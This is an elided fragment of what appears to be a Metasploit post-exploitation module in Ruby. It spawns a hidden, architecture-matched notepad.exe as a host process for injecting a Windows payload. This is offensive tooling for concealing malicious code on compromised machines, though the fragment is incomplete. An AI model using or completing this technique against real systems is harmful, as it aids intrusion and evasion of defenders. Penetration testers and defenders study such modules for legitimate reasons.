...
class MetasploitModule < Msf::Post
  ...
  def run
    ...
    unless session.framework.payloads.keys.grep(/windows/).include?(datastore['PAYLOAD'])
    ...
    pid = create_temp_proc(payload) if (pid == 0) || (!has_pid?(pid))
    if (payload.arch.join == ARCH_X64) && (client.arch == ARCH_X86)
  ...
  def create_temp_proc(pay)
    ...
    if (pay.arch.join == ARCH_X86) && (client.arch == ARCH_X86)
      cmd = "#{windir}\\System32\\notepad.exe"
    elsif (pay.arch.join == ARCH_X64) && (client.arch == ARCH_X64)
      cmd = "#{windir}\\System32\\notepad.exe"
    elsif (pay.arch.join == ARCH_X64) && (client.arch == ARCH_X86)
      cmd = "#{windir}\\Sysnative\\notepad.exe"
    elsif (pay.arch.join == ARCH_X86) && (client.arch == ARCH_X64)
      cmd = "#{windir}\\SysWOW64\\notepad.exe"
    end
    # run hidden
